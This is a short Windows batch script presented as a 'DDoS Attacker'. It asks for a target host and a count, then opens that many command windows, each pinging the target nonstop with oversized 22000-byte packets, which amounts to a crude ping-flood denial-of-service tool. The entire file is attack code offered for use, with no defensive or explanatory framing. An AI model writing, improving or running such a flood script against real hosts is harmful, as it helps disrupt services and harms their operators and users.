@echo off
title DDoS Attack
color 4
echo Welcome to the DDoS Attacker by ExpertTrout9232
echo.
set /p target=Enter the target: 
set /p b=Enter the strength: 
echo Starting DDoS Attack...
timeout /t 3 /nobreak
:loop
start cmd /k ping %target% /t /l 22000
set /a a+=1
if %a% == %b% goto next
goto loop
:next
pause
